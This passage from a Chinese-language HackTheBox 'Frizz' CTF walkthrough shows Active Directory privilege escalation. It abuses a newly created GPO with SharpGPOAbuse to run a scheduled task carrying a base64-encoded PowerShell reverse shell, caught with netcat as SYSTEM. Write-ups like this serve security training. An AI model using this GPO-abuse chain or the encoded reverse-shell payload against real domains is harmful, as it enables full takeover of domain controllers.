在 AD 建一個 GPC：`CN={GUID},CN=Policies,CN=System,<domainDN>`（物件 DN 以 GUID 命名）\
在 SYSVOL 建對應 GPT：`\\<domain>\SYSVOL\<domain>\Policies\{GUID}\`。
建立者將會成為 Owner（且對該 GPO 有 Full Control）。

```
PS C:\Users\M.SchoolBus\Desktop> New-GPO -Name chw | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes    

GpoId       : 0329b9b2-02c7-4796-a039-fb5123d758fb
DisplayName : chw
Enabled     : True
Enforced    : False
Target      : OU=Domain Controllers,DC=frizz,DC=htb
Order       : 3

```
> `"OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB"`: 把這個 GPO 連到「Domain Controllers」OU

#### 14.3 利用 SharpGPOAbuse.exe
![image](https://hackmd.io/_uploads/BJiIPkjtxl.png)\
( Kali 傳入 `SharpGPOAbuse.exe` )
```
┌──(chw㉿CHW)-[~/Desktop/upload_tools]
└─$ sudo ntpdate -u 10.10.11.60                                        
┌──(chw㉿CHW)-[~/Desktop/upload_tools]
└─$ impacket-getTGT frizz.htb/M.SchoolBus:'!suBcig@******!R' -dc-ip 10.10.11.60
...
[*] Saving ticket in M.SchoolBus.ccache                                                        
┌──(chw㉿CHW)-[~/Desktop/upload_tools]
└─$ export KRB5CCNAME=M.SchoolBus.ccache                       
┌──(chw㉿CHW)-[~/Desktop/upload_tools]
└─$ KRB5CCNAME=M.SchoolBus.ccache \
scp -P 22 -o GSSAPIAuthentication=yes -o PreferredAuthentications=gssapi-with-mic \
  ./SharpGPOAbuse.exe m.schoolbus@frizz.htb:"C:/Users/m.schoolbus/Desktop/"
SharpGPOAbuse.exe                                                                                                 100%   79KB  70.3KB/s   00:01    

```
```
┌──(chw㉿CHW)-[~/Desktop/upload_tools]
└─$ nc -lvnp 8888               
listening on [any] 8888 ...

```
(Windows: M.SchoolBus)
```
PS C:\Users\M.SchoolBus\Desktop> .\SharpGPOAbuse.exe --addcomputertask --gponame "chw" --author TCG --taskname PrivEsc --command "powershell.exe" --arguments "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgA3ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
[+] Domain = frizz.htb
[+] Domain Controller = frizzdc.frizz.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
[+] GUID of "chw" is: {BC54F62C-D0BC-4C50-AFD7-43E0ACE49DA2}
[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{BC54F62C-D0BC-4C50-AFD7-43E0ACE49DA2}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!
PS C:\Users\M.SchoolBus\Desktop> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.

```
> - `--addcomputertask`: 在「Computer Configuration → Preferences → Scheduled Tasks」新增一個「Immediate Task」
> - `--gponame "chw"`: 目標 GPO 顯示名稱（先在 AD 取到其 GUID）
> - `--author TCG`: 排程的作者欄位（寫入 XML 的中繼資料）
> - `--taskname PrivEsc`: 排程名稱（客戶端建立的工作名稱）
> - `--command "powershell.exe"`: 執行檔（排程要啟動的程式）
> - `--arguments "powershell -e <Base64>"`: 傳給上面執行檔的參數

(Kali)
```
┌──(chw㉿CHW)-[~/Desktop/upload_tools]
└─$ nc -lvnp 8888               
listening on [any] 8888 ...

connect to [10.10.14.67] from (UNKNOWN) [10.10.11.60] 53183
PS C:\Windows\system32>whoami
nt authority\system
```
### ✅ Get Root FLAG
![image](https://hackmd.io/_uploads/HJCocksKxl.png)


###### tags: `HTB` `Web` `CTF` `Windows` `GPO Abuse`
